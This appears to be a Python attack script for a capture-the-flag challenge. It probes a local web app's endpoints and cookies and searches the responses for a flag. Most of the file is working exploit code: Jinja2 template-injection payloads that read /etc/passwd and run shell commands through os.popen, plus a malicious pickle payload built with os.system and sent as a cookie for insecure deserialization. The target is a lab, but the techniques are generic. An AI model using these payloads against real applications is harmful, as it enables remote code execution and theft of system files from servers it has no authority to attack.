import requests
import base64
import json
import re
import sys

BASE_URL = "http://127.0.0.1:32827"

def analyze_cookie():
    """Analyze the bookmarks cookie structure"""
    print("=== 1. COOKIE DECODE ANALYSIS ===")
    
    # Given cookie value
    cookie_b64 = "W10K"
    print(f"Raw cookie value: bookmarks={cookie_b64}")
    
    # Base64 decode
    try:
        decoded = base64.b64decode(cookie_b64)
        print(f"Base64 decoded (bytes): {decoded}")
        print(f"Base64 decoded (string): {decoded.decode('utf-8')}")
        
        # Check for JSON
        try:
            json_data = json.loads(decoded)
            print(f"✓ JSON parsing successful: {json_data}")
            print(f"  Type: {type(json_data)}")
        except:
            print("✗ Not valid JSON")
            
        # Check if it's Python pickle format
        if decoded.startswith(b'\x80\x04'):  # Python 3 pickle header
            print("✓ Likely Python pickle format (header: 0x80 0x04)")
        else:
            print("✗ Not Python pickle format")
            
    except Exception as e:
        print(f"✗ Decoding failed: {e}")
    
    print()

def test_endpoints():
    """Test various endpoints"""
    print("=== 2. ENDPOINT DISCOVERY ===")
    
    cookies = {
        'bookmarks': 'W10K',
        'user': '46cfd3242b22494d99f6a1673699dfe1'
    }
    
    endpoints = [
        '/',
        '/debug',
        '/env',
        '/error',
        '/admin',
        '/add'
    ]
    
    for endpoint in endpoints:
        try:
            url = f"{BASE_URL}{endpoint}"
            print(f"\nTesting: {url}")
            
            response = requests.get(url, cookies=cookies, timeout=5, allow_redirects=True)
            
            print(f"  Method: GET")
            print(f"  Status: {response.status_code}")
            print(f"  Headers: {dict(response.headers)}")
            
            if response.cookies:
                print(f"  Cookies: {dict(response.cookies)}")
            
            # Check for flags in response
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag_match:
                print(f"[!] FLAG FOUND: {flag_match.group(0)}")
            
            # Show first 500 chars of response
            content_preview = response.text.replace('\n', ' ').replace('\r', '')[:500]
            print(f"  Response: {content_preview}...")
            
            # Look for interesting patterns
            patterns = [
                (r'<form\s+[^>]*name=\s*"name"', "name form field"),
                (r'<form\s+[^>]*name=\s*"url"', "url form field"),
                (r'name=[\'"]?form[\'"]?', "form parameter"),
                (r'name=[\'"]?csrf_token[\'"]?', "CSRF token"),
                (r'window\.__INITIAL_STATE__', "Initial state"),
                (r'{{.*}}', "Template delimiters"),
                (r'\[', "Array/square bracket")
            ]
            
            for pattern, desc in patterns:
                if re.search(pattern, response.text):
                    print(f"  [+] Pattern found: {desc}")
                    
        except Exception as e:
            print(f"  [!] Error: {e}")
            
    print()

def test_ssti_in_add():
    """Test SSTI in /add endpoint"""
    print("=== 3. SSTI TESTING ON /add ===")
    
    cookies = {
        'bookmarks': 'W10K',
        'user': '46cfd3242b22494d99f6a1673699dfe1'
    }
    
    # First, test if /add accepts POST
    test_url = f"{BASE_URL}/add"
    print(f"\nTesting: {test_url} with POST")
    
    try:
        response = requests.post(
            test_url,
            data={'name': 'test', 'url': 'http://example.com'},
            cookies=cookies,
            timeout=5,
            allow_redirects=False
        )
        print(f"  Status: {response.status_code}")
        print(f"  Full Response: {response.text}")
        
        # Check for redirect location
        if response.headers.get('Location'):
            print(f"  Redirect to: {response.headers['Location']}")
            
            # Follow redirect
            redirect_url = BASE_URL + response.headers['Location'] if response.headers['Location'].startswith('/') else response.headers['Location']
            print(f"  Following redirect to: {redirect_url}")
            
            redirect_resp = requests.get(redirect_url, timeout=5)
            print(f"  Final Status: {redirect_resp.status_code}")
            print(f"  Final Response: {redirect_resp.text}")
            
    except Exception as e:
        print(f"  [!] Error: {e}")
        
    print()
    
    # Now test SSTI payloads using the cookie
    print("=== 4. SSTI VIA BOOKMARKS COOKIE ===")
    print("Testing if bookmarks cookie is evaluated as template")
    
    # Try to add a bookmark with SSTI payload
    print("\nSending SSTI payload via POST...")
    
    # Test multiple payload types
    ssti_payloads = [
        # Basic Jinja2 SSTI
        {'name': '{{ 7*7 }}', 'url': 'http://test.com'},
        {'name': '{{ config }}', 'url': 'http://test.com'},
        {'name': '{{ config.items() }}', 'url': 'http://test.com'},
        
        # Command execution
        {'name': '{{ ".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}', 'url': 'http://test.com'},
        {'name': '{{ lipsum.__globals__.os.popen(\"id\").read() }}', 'url': 'http://test.com'},
        
        # Object traversal
        {'name': "{{ []['__class__']['__mro__'][2]['__subclasses__']()[0] }}", 'url': 'http://test.com'},
    ]
    
    for payload in ssti_payloads:
        try:
            print(f"\n[TEST] Payload: {payload['name']}")
            
            # Send payload
            resp = requests.post(
                f"{BASE_URL}/add",
                data=payload,
                cookies=cookies,
                timeout=5,
                allow_redirects=True
            )
            
            print(f"  Status: {resp.status_code}")
            
            # Check for SSTI output
            if "49" in resp.text:  # 7*7 = 49
                print(f"[!] SSTI CONFIRMED! 7*7 = 49 found in response")
            elif "config" in resp.text.lower():
                print(f"[+] Config data may be exposed")
                print(f"  Partial: {resp.text[:500]}")
                
            # Check for command execution
            if "root:" in resp.text or "uid=" in resp.text:
                print(f"[!] COMMAND EXECUTION! /etc/passwd or id output found")
                
        except Exception as e:
            print(f"  [!] Error: {e}")

def test_deserialization():
    """Test for insecure deserialization via cookies"""
    print("\n=== 5. DESERIALIZATION TESTING ===")
    
    # Test Python pickle deserialization
    print("\nTesting Python Pickle format...")
    print("Creating malicious pickle payload...")
    
    try:
        import pickle
        import os
        
        class Exploit:
            def __reduce__(self):
                return (os.system, ('echo "PWNED"',))
        
        # Generate malicious pickle
        malicious_pickle = pickle.dumps(Exploit(), protocol=4)
        payload_b64 = base64.b64encode(malicious_pickle).decode('ascii')
        
        print(f"Generated pickle payload (base64): {payload_b64[:100]}...")
        
        # Test with modified cookie
        malicious_cookies = {
            'bookmarks': payload_b64,
            'user': '46cfd3242b22494d99f6a1673699dfe1'
        }
        
        print(f"Testing with malicious pickle cookie...")
        resp = requests.get(BASE_URL, cookies=malicious_cookies, timeout=5)
        
        print(f"Status: {resp.status_code}")
        if "PWNED" in resp.text:
            print("[!] DESERIALIZATION VULNERABILITY CONFIRMED!")
            
    except Exception as e:
        print(f"  [!] Error in pickle test: {e}")
    
    # Test JSON with Python objects (if it's JSON but deserializes to objects)
    print("\nTesting JSON deserialization with objects...")
    
    # Create JSON that might trigger eval()
    json_payload = '{"__class__": "PWNED", "__reduce__": "eval(\"print(123)\")"}'
    json_b64 = base64.b64encode(json_payload.encode()).decode('ascii')
    
    print(f"JSON payload: {json_payload}")
    
    test_cookies = {
        'bookmarks': json_b64,
        'user': '46cfd3242b22494d99f6a1673699dfe1'
    }
    
    try:
        resp = requests.get(BASE_URL, cookies=test_cookies, timeout=5)
        print(f"  Status: {resp.status_code}")
        print(f"  Response: {resp.text[:500]}")
    except Exception as e:
        print(f"  [!] Error: {e}")

